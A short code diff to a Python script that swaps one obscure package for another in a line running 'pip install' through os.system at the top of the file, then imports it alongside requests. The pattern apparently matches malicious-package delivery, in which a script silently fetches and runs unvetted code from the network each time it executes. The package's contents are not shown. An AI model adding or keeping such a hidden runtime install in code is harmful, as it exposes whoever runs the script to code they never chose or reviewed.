@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipfontingaddonsV2")
-import pipfontingaddonsV2
+os.system("pip install pipsqlpackageV2")
+import pipsqlpackageV2
 import random
 import requests
 import time
